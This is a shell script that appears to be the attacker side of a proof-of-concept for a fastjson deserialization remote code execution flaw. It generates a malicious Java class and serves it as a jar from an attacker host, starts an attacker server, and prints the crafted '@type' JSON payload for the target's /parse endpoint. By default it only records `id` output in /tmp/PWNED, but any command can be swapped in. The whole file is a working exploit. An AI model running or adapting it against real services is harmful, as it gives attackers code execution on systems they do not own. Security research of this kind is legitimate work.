#!/bin/sh
set -e
HOST="${ATTACKER_HOST:-attacker}"
PORT="${ATTACKER_PORT:-8000}"
# Benign-by-default proof of code execution: capture `id` into /tmp/PWNED in the TARGET.
CMD="${PWN_CMD:-id >> /tmp/PWNED 2>&1; echo RCE_via_fastjson_JSONType >> /tmp/PWNED}"

mkdir -p /www /build
# internal class name MUST equal the crafted jar-URL (minus .class) so defineClass succeeds
java -cp "/opt/asm.jar:/opt" Gen "jar:http://${HOST}:${PORT}/probe!/POC" /build/POC.class "$CMD"
( cd /build && jar cf /www/probe POC.class )   # served at /probe, jar entry POC.class

echo "[attacker] malicious jar ready. use this payload against the target /parse:"
echo "           {\"@type\":\"jar:http:..${HOST}:${PORT}.probe!.POC\",\"x\":1}"
exec java -Dport="${PORT}" -cp /opt AttackerServer
